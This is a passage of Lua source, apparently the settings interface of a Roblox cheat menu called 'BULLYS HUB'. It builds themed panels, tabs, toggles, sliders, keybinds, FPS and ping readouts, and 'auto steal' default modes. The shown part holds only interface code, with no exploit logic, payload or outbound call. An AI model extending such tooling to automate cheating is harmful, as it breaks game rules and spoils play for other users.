    tContent.Size = UDim2.new(1, -20, 1, -46)

    tContent.Position = UDim2.new(0, 10, 0, 44)

    tContent.BackgroundTransparency = 1

    local tLayout = Instance.new("UIListLayout", tContent)

    tLayout.Padding = UDim.new(0, 8)

    tLayout.SortOrder = Enum.SortOrder.LayoutOrder

    -- Theme data

    local TD = {

        {"BLACK",   "preto",    Color3.fromRGB(170,170,170), Color3.fromRGB(10,10,10)},

    }

    for i, td in ipairs(TD) do

        local row = Instance.new("Frame", tContent)

        row.Size = UDim2.new(1, 0, 0, 36)

        row.BackgroundColor3 = Color3.fromRGB(30, 30, 30)

        row.BackgroundTransparency = 0.2

        row.BorderSizePixel = 0

        row.LayoutOrder = i

        Instance.new("UICorner", row).CornerRadius = UDim.new(0, 8)

        local dot = Instance.new("Frame", row)

        dot.Size = UDim2.new(0, 12, 0, 12)

        dot.Position = UDim2.new(0, 12, 0.5, -6)

        dot.BackgroundColor3 = td[3]

        dot.BorderSizePixel = 0

        Instance.new("UICorner", dot).CornerRadius = UDim.new(1, 0)

        local nameLbl = Instance.new("TextLabel", row)

        nameLbl.Size = UDim2.new(0.5, 0, 1, 0)

        nameLbl.Position = UDim2.new(0, 32, 0, 0)

        nameLbl.BackgroundTransparency = 1

        nameLbl.Text = td[1]

        nameLbl.Font = Enum.Font.GothamBold

        nameLbl.TextSize = 12

        nameLbl.TextColor3 = Color3.fromRGB(240, 240, 240)

        nameLbl.TextXAlignment = Enum.TextXAlignment.Left

        local apBtn = Instance.new("TextButton", row)

        apBtn.Size = UDim2.new(0, 72, 0, 24)

        apBtn.Position = UDim2.new(1, -78, 0.5, -12)

        apBtn.BackgroundColor3 = td[3]

        apBtn.Text = "APPLY"

        apBtn.Font = Enum.Font.GothamBold

        apBtn.TextSize = 10

        apBtn.TextColor3 = Color3.new(0, 0, 0)

        apBtn.AutoButtonColor = false

        Instance.new("UICorner", apBtn).CornerRadius = UDim.new(0, 6)

        local tid = td[2]

        apBtn.MouseButton1Click:Connect(function()

            applyTheme(tid)

            -- feedback visual

            local oldBg = tPanel.BackgroundColor3

            -- tween removed

            task.delay(0.5, function()

                -- tween removed

            end)

        end)

        apBtn.MouseEnter:Connect(function()

            -- tween removed

            -- tween removed

        end)

        apBtn.MouseLeave:Connect(function()

            -- tween removed

            -- tween removed

        end)

    end

    -- Botão de tema desativado - substituido pela nova UI

    local tToggle = Instance.new("TextButton", tGui)

    tToggle.Name = "ThemeToggleBtn"

    tToggle.Visible = false

    tToggle.Size = UDim2.new(0, 36, 0, 36)

    tToggle.Position = UDim2.new(0, 10, 0, 10)

    tToggle.BackgroundColor3 = Color3.fromRGB(20, 20, 20)

    tToggle.BackgroundTransparency = 0.1

    tToggle.Text = ""

    tToggle.Font = Enum.Font.GothamBlack

    tToggle.TextSize = 18

    tToggle.TextColor3 = Color3.fromRGB(185, 185, 185)

    tToggle.AutoButtonColor = false

    Instance.new("UICorner", tToggle).CornerRadius = UDim.new(1, 0)

    MakeDraggable(tToggle, tToggle)

    tToggle.MouseButton1Click:Connect(function()

        tPanel.Visible = not tPanel.Visible

        if tPanel.Visible then

            tPanel.Position = UDim2.new(

                tToggle.Position.X.Scale, tToggle.AbsolutePosition.X + 44,

                tToggle.Position.Y.Scale, tToggle.AbsolutePosition.Y

            )

        end

    end)

    -- Pulso no botão toggle

    task.spawn(function()

        while tToggle.Parent do

            -- tween removed

            task.wait(1.6)

        end

    end)

    -- Expor ref global para outros scripts

    _G.ThemeUI = {panel = tPanel, toggle = tToggle, apply = applyTheme}

end)

function buildBullysSettingsUI()

    local pg = PlayerGui

    if not pg then return end

    local old = pg:FindFirstChild("BullysSettings")

    if old then old:Destroy() end

    -- Sound tocado ao clicar em qualquer opção do menu (toggles, tabs, etc.)

    local selectSound = pg:FindFirstChild("BullysSelectSound")

    if not selectSound then

        selectSound = Instance.new("Sound")

        selectSound.Name    = "BullysSelectSound"

        selectSound.Parent  = pg

    end

    selectSound.SoundId = "rbxassetid://" .. (Config.SelectSoundId or "3779096010")

    selectSound.Volume  = tonumber(Config.SelectSoundVolume) or 1

    local function playSelect()

        if Config.SelectSoundEnabled == false then return end

        pcall(function()

            selectSound.TimePosition = 0

            selectSound:Play()

        end)

    end

    _G.BullysPlaySelect = playSelect

    _G.BullysRefreshSelectSound = function()

        selectSound.SoundId = "rbxassetid://" .. (Config.SelectSoundId or "3779096010")

        selectSound.Volume  = tonumber(Config.SelectSoundVolume) or 1

    end

    -- ── CORES ─────────────────────────────────────────────────────────────

    local function C() return {

        BG   = Color3.fromRGB(8,8,12),

        SURF = Color3.fromRGB(14,14,20),

        SH   = Color3.fromRGB(22,22,35),

        AC   = Color3.fromRGB(80, 140, 255),

        TP   = Color3.fromRGB(185,188,215),

        TS   = Color3.fromRGB(120,122,155),

        ERR  = Color3.fromRGB(200,60,60),

        SUC  = Color3.fromRGB(80, 140, 255),

    } end

    local bsg = Instance.new("ScreenGui")

    bsg.Name           = "BullysSettings"

    bsg.ResetOnSpawn   = false

    bsg.DisplayOrder   = 20

    bsg.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

    bsg.IgnoreGuiInset = false

    bsg.Parent         = pg

    -- ── PANEL: totalmente transparente, sem bordas pesadas ────────────────

    local panel = Instance.new("Frame", bsg)

    panel.Name                  = "MainPanel"

    panel.Size                  = UDim2.new(0, 370, 0, 490)

    do

        local sp = Config.BullysSettingsPos

        panel.Position = sp

            and UDim2.new(sp.X, 0, sp.Y, 0)

            or  UDim2.new(0, 70, 0.5, -245)

    end

    panel.BackgroundColor3      = Color3.fromRGB(8, 8, 10)

    panel.BackgroundTransparency = 0.18

    panel.BorderSizePixel       = 0

    panel.Visible               = false

    Instance.new("UICorner", panel).CornerRadius = UDim.new(0, 8)

    -- borda ultra-fina, estática (sem loop Heartbeat)

    -- ── DRAG ──────────────────────────────────────────────────────────────

    MakeDraggable(panel, panel)

    do

        local dragging, ds, dp = false, nil, nil

        panel.InputBegan:Connect(function(i)

            if Config.UILocked then return end

            if i.UserInputType == Enum.UserInputType.MouseButton1 then

                dragging = true; ds = i.Position; dp = panel.AbsolutePosition

            end

        end)

        UserInputService.InputChanged:Connect(function(i)

            if dragging and i.UserInputType == Enum.UserInputType.MouseMovement then

                local d = i.Position - ds

                panel.Position = UDim2.new(0, dp.X + d.X, 0, dp.Y + d.Y)

            end

        end)

        UserInputService.InputEnded:Connect(function(i)

            if i.UserInputType == Enum.UserInputType.MouseButton1 and dragging then

                dragging = false

                local ps = panel.Parent.AbsoluteSize

                Config.BullysSettingsPos = {

                    X = panel.AbsolutePosition.X / ps.X,

                    Y = panel.AbsolutePosition.Y / ps.Y,

                }

                SaveConfig()

            end

        end)

    end

    -- ── HEADER: slim, transparente ────────────────────────────────────────

    local hdr = Instance.new("Frame", panel)

    hdr.Size                 = UDim2.new(1, 0, 0, 44)

    hdr.BackgroundTransparency = 1

    -- Ícone (thumbnail do asset) no canto esquerdo, maior e com borda arredondada

    local hIcon = Instance.new("ImageLabel", hdr)

    hIcon.Size                 = UDim2.new(0, 36, 0, 36)

    hIcon.Position             = UDim2.new(0, 6, 0.5, -18)

    hIcon.BackgroundTransparency = 1

    hIcon.Image                = "rbxthumb://type=Asset&id=104691346948495&w=150&h=150"

    hIcon.ScaleType            = Enum.ScaleType.Fit

    Instance.new("UICorner", hIcon).CornerRadius = UDim.new(0, 8)

    -- Título

    local hTitle = Instance.new("TextLabel", hdr)

    hTitle.Size              = UDim2.new(0, 150, 1, 0)

    hTitle.Position          = UDim2.new(0, 48, 0, 0)

    hTitle.BackgroundTransparency = 1

    hTitle.Text              = "BULLYS HUB"

    hTitle.Font              = Enum.Font.GothamBlack

    hTitle.TextSize          = 13

    hTitle.TextColor3        = Color3.fromRGB(220, 220, 220)

    hTitle.TextTransparency  = 0.15

    hTitle.TextXAlignment    = Enum.TextXAlignment.Left

    -- Créditos no meio do header

    local hCredits = Instance.new("TextLabel", hdr)

    hCredits.Size              = UDim2.new(0, 110, 1, 0)

    hCredits.Position          = UDim2.new(0, 200, 0, 0)

    hCredits.BackgroundTransparency = 1

    hCredits.Text              = "discord.gg/Bullys"

    hCredits.Font              = Enum.Font.GothamBold

    hCredits.TextSize          = 10

    hCredits.TextColor3        = Color3.fromRGB(140, 140, 150)

    hCredits.TextTransparency  = 0.15

    hCredits.TextXAlignment    = Enum.TextXAlignment.Center

    hCredits.TextYAlignment    = Enum.TextYAlignment.Center

    -- FPS (linha superior à direita)

    local hFps = Instance.new("TextLabel", hdr)

    hFps.Size              = UDim2.new(0, 80, 0, 18)

    hFps.Position          = UDim2.new(1, -90, 0, 6)

    hFps.BackgroundTransparency = 1

    hFps.RichText          = true

    hFps.Text              = ""

    hFps.Font              = Enum.Font.GothamBold

    hFps.TextSize          = 10

    hFps.TextXAlignment    = Enum.TextXAlignment.Right

    hFps.TextColor3        = Color3.fromRGB(160, 160, 160)

    -- PING (linha inferior à direita, logo abaixo do FPS)

    local hPing = Instance.new("TextLabel", hdr)

    hPing.Size             = UDim2.new(0, 80, 0, 18)

    hPing.Position         = UDim2.new(1, -90, 0, 22)

    hPing.BackgroundTransparency = 1

    hPing.RichText         = true

    hPing.Text             = ""

    hPing.Font             = Enum.Font.GothamBold

    hPing.TextSize         = 10

    hPing.TextXAlignment   = Enum.TextXAlignment.Right

    hPing.TextColor3       = Color3.fromRGB(160, 160, 160)

    do

        local fr, ac = 0, 0

        RunService.Heartbeat:Connect(function(dt)

            if not hFps.Parent then return end

            fr += 1; ac += dt

            if ac < 1 then return end

            local ping = math.floor(LocalPlayer:GetNetworkPing() * 1000)

            local fc = fr >= 50 and "80,230,120" or (fr >= 30 and "255,200,60" or "255,80,80")

            local pc = ping < 100 and "80,230,120" or (ping < 200 and "255,200,60" or "255,80,80")

            hFps.Text  = string.format("<font color='rgb(%s)'>%d fps</font>", fc, fr)

            hPing.Text = string.format("<font color='rgb(%s)'>%d ms</font>", pc, ping)

            fr, ac = 0, 0

        end)

    end

    -- Linha divisória (1px, sem animação)

    local div = Instance.new("Frame", panel)

    div.Size                 = UDim2.new(1, -20, 0, 1)

    div.Position             = UDim2.new(0, 10, 0, 44)

    div.BackgroundColor3     = Color3.fromRGB(50, 50, 60)

    div.BackgroundTransparency = 0.2

    div.BorderSizePixel      = 0

    -- ── HELPERS para criar rows ───────────────────────────────────────────

    local function makeScroll()

        local sf = Instance.new("ScrollingFrame", panel)

        sf.Size                = UDim2.new(1, -80, 1, -60)

        sf.Position            = UDim2.new(0, 72, 0, 50)

        sf.BackgroundTransparency = 1

        sf.BorderSizePixel     = 0

        sf.ScrollBarThickness  = 5

        sf.ScrollBarImageColor3 = Color3.fromRGB(120, 120, 150)

        sf.ScrollBarImageTransparency = 0.2

        sf.ScrollingDirection  = Enum.ScrollingDirection.Y

        sf.ScrollingEnabled    = true

        sf.Active              = true

        sf.CanvasSize          = UDim2.new(0, 0, 0, 0)

        sf.AutomaticCanvasSize = Enum.AutomaticSize.Y

        sf.Visible             = false

        local lay = Instance.new("UIListLayout", sf)

        lay.Padding            = UDim.new(0, 3)

        lay.SortOrder          = Enum.SortOrder.LayoutOrder

        local pad = Instance.new("UIPadding", sf)

        pad.PaddingLeft        = UDim.new(0, 10)

        pad.PaddingRight       = UDim.new(0, 10)

        pad.PaddingTop         = UDim.new(0, 6)

        pad.PaddingBottom      = UDim.new(0, 10)

        -- Fallback manual: recomputa CanvasSize quando o layout muda

        lay:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()

            sf.CanvasSize = UDim2.new(0, 0, 0, lay.AbsoluteContentSize.Y + 20)

        end)

        return sf

    end

    -- Row genérico (transparente, sem stroke)

    local function makeRow(parent, h, order)

        local r = Instance.new("Frame", parent)

        r.Size                  = UDim2.new(1, 0, 0, h or 32)

        r.BackgroundColor3      = Color3.fromRGB(20, 20, 26)

        r.BackgroundTransparency = 0.3

        r.BorderSizePixel       = 0

        r.LayoutOrder           = order or 0

        Instance.new("UICorner", r).CornerRadius = UDim.new(0, 6)

        return r

    end

    -- Label de seção (header de grupo)

    local function makeSec(parent, text, order)

        local r = Instance.new("Frame", parent)

        r.Size                  = UDim2.new(1, 0, 0, 20)

        r.BackgroundTransparency = 1

        r.LayoutOrder           = order or 0

        local lbl = Instance.new("TextLabel", r)

        lbl.Size                = UDim2.new(1, -8, 1, 0)

        lbl.Position            = UDim2.new(0, 8, 0, 0)

        lbl.BackgroundTransparency = 1

        lbl.Text                = text

        lbl.Font                = Enum.Font.GothamBlack

        lbl.TextSize            = 9

        lbl.TextColor3          = Color3.fromRGB(100, 100, 120)

        lbl.TextXAlignment      = Enum.TextXAlignment.Left

        lbl.TextTransparency    = 0

        -- linha decorativa

        local line = Instance.new("Frame", r)

        line.Size               = UDim2.new(1, -90, 0, 1)

        line.Position           = UDim2.new(0, 82, 0.5, 0)

        line.BackgroundColor3   = Color3.fromRGB(40, 40, 55)

        line.BorderSizePixel    = 0

        return r

    end

    -- Toggle switch: design slim, sem tween pesado

    local function makeToggle(parent, label, getState, onSet, order)

        local r = makeRow(parent, 32, order)

        local lbl = Instance.new("TextLabel", r)

        lbl.Size                = UDim2.new(1, -58, 1, 0)

        lbl.Position            = UDim2.new(0, 10, 0, 0)

        lbl.BackgroundTransparency = 1

        lbl.Text                = label

        lbl.Font                = Enum.Font.GothamBold

        lbl.TextSize            = 11

        lbl.TextColor3          = Color3.fromRGB(200, 200, 210)

        lbl.TextXAlignment      = Enum.TextXAlignment.Left

        local sw = Instance.new("Frame", r)

        sw.Size                 = UDim2.new(0, 36, 0, 18)

        sw.Position             = UDim2.new(1, -44, 0.5, -9)

        sw.BackgroundColor3     = getState() and Color3.fromRGB(80, 200, 120) or Color3.fromRGB(45, 45, 55)

        sw.BorderSizePixel      = 0

        Instance.new("UICorner", sw).CornerRadius = UDim.new(1, 0)

        local dot = Instance.new("Frame", sw)

        dot.Size                = UDim2.new(0, 14, 0, 14)

        dot.Position            = getState() and UDim2.new(1, -16, 0.5, -7) or UDim2.new(0, 2, 0.5, -7)

        dot.BackgroundColor3    = Color3.new(1, 1, 1)

        dot.BorderSizePixel     = 0

        Instance.new("UICorner", dot).CornerRadius = UDim.new(1, 0)

        local btn = Instance.new("TextButton", sw)

        btn.Size                = UDim2.new(1, 0, 1, 0)

        btn.BackgroundTransparency = 1

        btn.Text                = ""

        btn.AutoButtonColor     = false

        local function refresh()

            local on = getState()

            sw.BackgroundColor3  = on and Color3.fromRGB(80, 200, 120) or Color3.fromRGB(45, 45, 55)

            dot.Position         = on and UDim2.new(1, -16, 0.5, -7) or UDim2.new(0, 2, 0.5, -7)

        end

        btn.MouseButton1Click:Connect(function()

            playSelect()

            onSet(not getState()); refresh()

        end)

        return { refresh = refresh }

    end

    -- Slider numérico: label + valor + barra arrastável
    local function makeSlider(parent, label, getVal, setVal, minV, maxV, suffix, order)
        local r = makeRow(parent, 48, order)
        local lbl = Instance.new("TextLabel", r)
        lbl.Size = UDim2.new(0.6, -10, 0, 20)
        lbl.Position = UDim2.new(0, 10, 0, 4)
        lbl.BackgroundTransparency = 1
        lbl.Text = label
        lbl.Font = Enum.Font.GothamBold
        lbl.TextSize = 11
        lbl.TextColor3 = Color3.fromRGB(200, 200, 210)
        lbl.TextXAlignment = Enum.TextXAlignment.Left

        local val = Instance.new("TextLabel", r)
        val.Size = UDim2.new(0.4, -10, 0, 20)
        val.Position = UDim2.new(0.6, 0, 0, 4)
        val.BackgroundTransparency = 1
        val.Font = Enum.Font.GothamBold
        val.TextSize = 11
        val.TextColor3 = Color3.fromRGB(200, 200, 210)
        val.TextXAlignment = Enum.TextXAlignment.Right

        local track = Instance.new("Frame", r)
        track.Size = UDim2.new(1, -20, 0, 4)
        track.Position = UDim2.new(0, 10, 1, -14)
        track.BackgroundColor3 = Color3.fromRGB(45, 45, 55)
        track.BorderSizePixel = 0
        Instance.new("UICorner", track).CornerRadius = UDim.new(1, 0)

        local fill = Instance.new("Frame", track)
        fill.BackgroundColor3 = Color3.fromRGB(120, 180, 255)
        fill.BorderSizePixel = 0
        Instance.new("UICorner", fill).CornerRadius = UDim.new(1, 0)

        local knob = Instance.new("TextButton", track)
        knob.Size = UDim2.new(0, 12, 0, 12)
        knob.BackgroundColor3 = Color3.new(1, 1, 1)
        knob.Text = ""; knob.AutoButtonColor = false; knob.BorderSizePixel = 0
        Instance.new("UICorner", knob).CornerRadius = UDim.new(1, 0)

        local function pctFromVal(v)
            return math.clamp((v - minV) / (maxV - minV), 0, 1)
        end

        local function refresh()
            local v = getVal() or minV
            local pct = pctFromVal(v)
            fill.Size    = UDim2.new(pct, 0, 1, 0)
            knob.Position= UDim2.new(pct, -6, 0.5, -6)
            val.Text     = string.format("%.2f", v) .. (suffix or "")
        end
        refresh()

        local UIS_ = game:GetService("UserInputService")
        local dragging = false
        local function updateFromX(absX)
            local trackPos  = track.AbsolutePosition.X
            local trackSize = track.AbsoluteSize.X
            local pct       = math.clamp((absX - trackPos) / math.max(trackSize, 1), 0, 1)
            local v = minV + pct * (maxV - minV)
            setVal(v)
            refresh()
        end

        knob.InputBegan:Connect(function(i)
            if i.UserInputType == Enum.UserInputType.MouseButton1
               or i.UserInputType == Enum.UserInputType.Touch then
                dragging = true
            end
        end)
        track.InputBegan:Connect(function(i)
            if i.UserInputType == Enum.UserInputType.MouseButton1
               or i.UserInputType == Enum.UserInputType.Touch then
                dragging = true
                updateFromX(i.Position.X)
            end
        end)
        UIS_.InputEnded:Connect(function(i)
            if i.UserInputType == Enum.UserInputType.MouseButton1
               or i.UserInputType == Enum.UserInputType.Touch then
                dragging = false
            end
        end)
        UIS_.InputChanged:Connect(function(i)
            if dragging and
               (i.UserInputType == Enum.UserInputType.MouseMovement
                or i.UserInputType == Enum.UserInputType.Touch) then
                updateFromX(i.Position.X)
            end
        end)

        return { refresh = refresh }
    end

    -- Keybind button

    local function makeKey(parent, label, getVal, setVal, order)

        local r = makeRow(parent, 32, order)

        local lbl = Instance.new("TextLabel", r)

        lbl.Size                = UDim2.new(1, -96, 1, 0)

        lbl.Position            = UDim2.new(0, 10, 0, 0)

        lbl.BackgroundTransparency = 1

        lbl.Text                = label

        lbl.Font                = Enum.Font.GothamBold

        lbl.TextSize            = 11

        lbl.TextColor3          = Color3.fromRGB(200, 200, 210)

        lbl.TextXAlignment      = Enum.TextXAlignment.Left

        local kBtn = Instance.new("TextButton", r)

        kBtn.Size               = UDim2.new(0, 52, 0, 22)

        kBtn.Position           = UDim2.new(1, -84, 0.5, -11)

        kBtn.BackgroundColor3   = Color3.fromRGB(22, 22, 30)

        kBtn.BackgroundTransparency = 0.1

        kBtn.Text               = getVal()

        kBtn.Font               = Enum.Font.GothamBold

        kBtn.TextSize           = 10

        kBtn.TextColor3         = Color3.fromRGB(140, 180, 255)

        kBtn.BorderSizePixel    = 0

        kBtn.AutoButtonColor    = false

        Instance.new("UICorner", kBtn).CornerRadius = UDim.new(0, 5)

        local xBtn = Instance.new("TextButton", r)

        xBtn.Size               = UDim2.new(0, 22, 0, 22)

        xBtn.Position           = UDim2.new(1, -30, 0.5, -11)

        xBtn.BackgroundColor3   = Color3.fromRGB(140, 60, 60)

        xBtn.BackgroundTransparency = 0.1

        xBtn.Text               = "X"

        xBtn.Font               = Enum.Font.GothamBlack

        xBtn.TextSize           = 11

        xBtn.TextColor3         = Color3.fromRGB(255, 230, 230)

        xBtn.BorderSizePixel    = 0

        xBtn.AutoButtonColor    = false

        Instance.new("UICorner", xBtn).CornerRadius = UDim.new(0, 5)

        xBtn.MouseButton1Click:Connect(function()

            playSelect()

            setVal(""); kBtn.Text = "NONE"; SaveConfig()

        end)

        local listening = false

        kBtn.MouseButton1Click:Connect(function()

            if listening then return end

            playSelect()

            listening = true; kBtn.Text = "..."

            local conn

            conn = UserInputService.InputBegan:Connect(function(inp, gp)

                if gp then return end

                if inp.UserInputType == Enum.UserInputType.Keyboard then

                    local n = inp.KeyCode.Name

                    if n and n ~= "Unknown" then

                        setVal(n); kBtn.Text = n; SaveConfig()

                    end

                end

                listening = false; conn:Disconnect()

            end)

            task.delay(5, function()

                if listening then

                    listening = false; conn:Disconnect()

                    kBtn.Text = getVal()

                end

            end)

        end)

    end

    -- Botão de ação simples

    local function makeBtn(parent, label, order, onClick)

        local r = makeRow(parent, 32, order)

        local btn = Instance.new("TextButton", r)

        btn.Size                = UDim2.new(1, 0, 1, 0)

        btn.BackgroundTransparency = 1

        btn.Text                = label

        btn.Font                = Enum.Font.GothamBold

        btn.TextSize            = 11

        btn.TextColor3          = Color3.fromRGB(140, 180, 255)

        btn.BorderSizePixel     = 0

        btn.AutoButtonColor     = false

        btn.TextXAlignment      = Enum.TextXAlignment.Left

        local lpad = Instance.new("UIPadding", btn)

        lpad.PaddingLeft        = UDim.new(0, 10)

        btn.MouseButton1Click:Connect(onClick)

        return btn

    end

    -- ── TABS: horizontal pill bar, slim ──────────────────────────────────

    local TABS2 = {

        {name="CFG",  id="cfg"},

        {name="VIS",  id="vis"},

        {name="MOV",  id="mov"},

        {name="TP",   id="tp"},

        {name="UI",   id="uih"},

    }

    local tabBar = Instance.new("Frame", panel)

    tabBar.Size                 = UDim2.new(0, 58, 1, -60)

    tabBar.Position             = UDim2.new(0, 8, 0, 50)

    tabBar.BackgroundColor3     = Color3.fromRGB(14, 14, 18)

    tabBar.BackgroundTransparency = 0.2

    tabBar.BorderSizePixel      = 0

    Instance.new("UICorner", tabBar).CornerRadius = UDim.new(0, 7)

    local tabPad = Instance.new("UIPadding", tabBar)

    tabPad.PaddingTop    = UDim.new(0, 4)

    tabPad.PaddingBottom = UDim.new(0, 4)

    local tabLayout = Instance.new("UIListLayout", tabBar)

    tabLayout.FillDirection     = Enum.FillDirection.Vertical

    tabLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center

    tabLayout.VerticalAlignment = Enum.VerticalAlignment.Top

    tabLayout.Padding           = UDim.new(0, 3)

    -- cArea removido (estava sobrepondo os scrollframes e bloqueando scroll)

    local tBtns2   = {}

    local tScrolls2 = {}

    local activTab2 = "cfg"

    local function switchTab2(id)

        if not tScrolls2[id] then id = "cfg" end

        activTab2 = id

        if _G.BullysSettingsUI then _G.BullysSettingsUI.currentTab = id end

        for tid, sc in pairs(tScrolls2) do sc.Visible = (tid == id) end

        for tid, tb in pairs(tBtns2) do

            local on = (tid == id)

            tb.BackgroundColor3      = on and Color3.fromRGB(70, 70, 90) or Color3.fromRGB(0, 0, 0)

            tb.BackgroundTransparency = on and 0.1 or 1

            tb.TextColor3            = on and Color3.fromRGB(230, 230, 240) or Color3.fromRGB(100, 100, 120)

        end

    end

    for _, td in ipairs(TABS2) do

        local tb = Instance.new("TextButton", tabBar)

        tb.Size                 = UDim2.new(1, -4, 0, 30)

        tb.BackgroundColor3     = Color3.fromRGB(0, 0, 0)

        tb.BackgroundTransparency = 1

        tb.Text                 = td.name

        tb.Font                 = Enum.Font.GothamBold

        tb.TextSize             = 10

        tb.TextColor3           = Color3.fromRGB(100, 100, 120)

        tb.BorderSizePixel      = 0

        tb.AutoButtonColor      = false

        Instance.new("UICorner", tb).CornerRadius = UDim.new(0, 5)

        tBtns2[td.id] = tb

        tScrolls2[td.id] = makeScroll()

        local tid = td.id

        tb.MouseButton1Click:Connect(function() playSelect(); switchTab2(tid) end)

    end

    -- (footer removido — "discord.gg/Bullys" agora fica no header)

    -- ── CONFIG TAB ──

    local cS = tScrolls2["cfg"]

    -- ─── AUTO STEAL DEFAULTS ─────────────────────────────────────────────

    makeSec(cS, "AUTO STEAL DEFAULTS", 37)

    do

        local rSwitches = {}

        local function applyDefMode(mode)

            Config.DefaultToNearest  = (mode == "nearest")

            Config.DefaultToHighest  = (mode == "highest")

            Config.DefaultToPriority = (mode == "priority")

            Config.DefaultToDisable  = (mode == "disable")

            Config.AutoTPPriority    = (mode == "nearest" or mode == "priority")

            SaveConfig()

            for _id, _sw in pairs(rSwitches) do

                local _on = (_id=="nearest"  and Config.DefaultToNearest)

                         or (_id=="highest"  and Config.DefaultToHighest)

                         or (_id=="priority" and Config.DefaultToPriority)

                         or (_id=="disable"  and Config.DefaultToDisable)

                TweenService:Create(_sw.dot, TweenInfo.new(0.15), {Position = _on and UDim2.new(1,-17,0.5,-7.5) or UDim2.new(0,2,0.5,-7.5)}):Play()

                -- tween removed

            end

        end

        local function makeRadioSwitch(parent, label, id, order)

            local isOn = (id=="nearest"  and Config.DefaultToNearest)

                      or (id=="highest"  and Config.DefaultToHighest)

                      or (id=="priority" and Config.DefaultToPriority)

                      or (id=="disable"  and Config.DefaultToDisable)

            local row = Instance.new("Frame", parent)

            row.Size = UDim2.new(1,0,0,36)

            row.BackgroundColor3 = C().SURF

            row.BackgroundTransparency = 0

            row.BorderSizePixel = 0

            row.LayoutOrder = order

            Instance.new("UICorner", row).CornerRadius = UDim.new(0,7)

            local tl = Instance.new("TextLabel", row)

            tl.Size = UDim2.new(1,-54,1,0)

            tl.Position = UDim2.new(0,10,0,0)

            tl.BackgroundTransparency = 1

            tl.Text = label

            tl.Font = Enum.Font.GothamBold

            tl.TextSize = 12

            tl.TextColor3 = C().TP

            tl.TextXAlignment = Enum.TextXAlignment.Left

            local sw = Instance.new("Frame", row)

            sw.Size = UDim2.new(0,38,0,20)

            sw.Position = UDim2.new(1,-46,0.5,-10)

            sw.BackgroundColor3 = isOn and Color3.fromRGB(80, 140, 255) or Color3.fromRGB(22,22,35)

            Instance.new("UICorner", sw).CornerRadius = UDim.new(1,0)

            local dot = Instance.new("Frame", sw)

            dot.Size = UDim2.new(0,15,0,15)

            dot.Position = isOn and UDim2.new(1,-17,0.5,-7.5) or UDim2.new(0,2,0.5,-7.5)

            dot.BackgroundColor3 = Color3.new(1,1,1)

            Instance.new("UICorner", dot).CornerRadius = UDim.new(1,0)

            local btn = Instance.new("TextButton", sw)

            btn.Size = UDim2.new(1,0,1,0)

            btn.BackgroundTransparency = 1

            btn.Text = ""

            btn.MouseButton1Click:Connect(function() applyDefMode(id) end)

            rSwitches[id] = {bg=sw, dot=dot}

        end

        makeRadioSwitch(cS, "Default To Nearest",  "nearest",  38)

        makeRadioSwitch(cS, "Default To Highest",  "highest",  39)

        makeRadioSwitch(cS, "Default To Priority", "priority", 40)

        makeRadioSwitch(cS, "Default Disable",     "disable",  41)

    end

    -- Minimum Nearest textbox (na aba CFG)
    do
        local r = makeRow(cS, 34, 42)
        local lbl = Instance.new("TextLabel", r)
        lbl.Size = UDim2.new(1, -120, 1, 0)
        lbl.Position = UDim2.new(0, 10, 0, 0)
        lbl.BackgroundTransparency = 1
        lbl.Text = "Minimum Nearest"
        lbl.Font = Enum.Font.GothamBold
        lbl.TextSize = 11
        lbl.TextColor3 = Color3.fromRGB(185, 188, 215)
        lbl.TextXAlignment = Enum.TextXAlignment.Left
        local tb = Instance.new("TextBox", r)
        tb.Size = UDim2.new(0, 100, 0, 24)
        tb.Position = UDim2.new(1, -110, 0.5, -12)
        tb.BackgroundColor3 = Color3.fromRGB(22, 22, 35)
        tb.Text = tostring(Config.MinimumNearest or "")
        tb.Font = Enum.Font.Gotham
        tb.TextSize = 11
        tb.TextColor3 = Color3.fromRGB(185, 188, 215)
        tb.PlaceholderText = "e.g. 10m, 500k"
        tb.ClearTextOnFocus = false
        Instance.new("UICorner", tb).CornerRadius = UDim.new(0, 4)
        tb.FocusLost:Connect(function()
            Config.MinimumNearest = tb.Text:gsub("%s", "")
            SaveConfig()
            ShowNotification("MIN NEAREST", Config.MinimumNearest ~= "" and Config.MinimumNearest or "OFF")
        end)
    end

    -- ─── MENU SOUND ─────────────────────────────────────────────────────

    makeSec(cS, "MENU SOUND", 55)

    makeToggle(cS, "Enable Select Sound",
        function() return Config.SelectSoundEnabled ~= false end,
        function(v) Config.SelectSoundEnabled = v; SaveConfig() end, 56)

    do
        local r = makeRow(cS, 34, 57)
        local lbl = Instance.new("TextLabel", r)
        lbl.Size = UDim2.new(0.45, 0, 1, 0); lbl.Position = UDim2.new(0, 10, 0, 0)
        lbl.BackgroundTransparency = 1; lbl.Text = "Sound ID"
        lbl.Font = Enum.Font.GothamBold; lbl.TextSize = 11
        lbl.TextColor3 = Color3.fromRGB(200, 200, 210); lbl.TextXAlignment = Enum.TextXAlignment.Left

        local tb = Instance.new("TextBox", r)
        tb.Size = UDim2.new(0, 110, 0, 24); tb.Position = UDim2.new(1, -156, 0.5, -12)
        tb.BackgroundColor3 = Color3.fromRGB(30, 30, 40); tb.Text = tostring(Config.SelectSoundId or "3779096010")
        tb.Font = Enum.Font.Gotham; tb.TextSize = 11; tb.TextColor3 = Color3.fromRGB(220, 220, 230)
        tb.ClearTextOnFocus = false; tb.BorderSizePixel = 0
        Instance.new("UICorner", tb).CornerRadius = UDim.new(0, 5)
        tb.FocusLost:Connect(function()
            local id = tb.Text:match("%d+")
            if id then
                Config.SelectSoundId = id; SaveConfig()
                if _G.BullysRefreshSelectSound then _G.BullysRefreshSelectSound() end
            end
            tb.Text = tostring(Config.SelectSoundId or "")
        end)

        local testBtn = Instance.new("TextButton", r)
        testBtn.Size = UDim2.new(0, 40, 0, 24); testBtn.Position = UDim2.new(1, -42, 0.5, -12)
        testBtn.BackgroundColor3 = Color3.fromRGB(80, 140, 255); testBtn.Text = "test"
        testBtn.TextColor3 = Color3.new(0, 0, 0); testBtn.Font = Enum.Font.GothamBold
        testBtn.TextSize = 11; testBtn.BorderSizePixel = 0; testBtn.AutoButtonColor = false
        Instance.new("UICorner", testBtn).CornerRadius = UDim.new(0, 5)
        testBtn.MouseButton1Click:Connect(function()
            if _G.BullysPlaySelect then _G.BullysPlaySelect() end
        end)
    end

    makeSlider(cS, "Volume",
        function() return Config.SelectSoundVolume or 1 end,
        function(v)
